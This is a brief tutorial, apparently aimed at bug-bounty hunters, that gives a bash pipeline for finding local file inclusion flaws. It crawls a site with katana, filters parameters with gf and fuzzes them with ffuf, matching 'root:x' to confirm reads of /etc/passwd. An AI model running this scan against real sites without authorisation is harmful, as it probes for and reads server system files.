# How to Hunt for LFI Vulnerabilities

```bash 
echo "example.com" | katana -o katana.txt

cat katana.txt | sort -u | urldedupe > urls.txt

cat urls.txt | gf lfi | qsreplace FUZZ > lfi.txt

cat lfi.txt | while read url; do ffuf -u $url -w payloads.txt -mr "root:x"; done

```




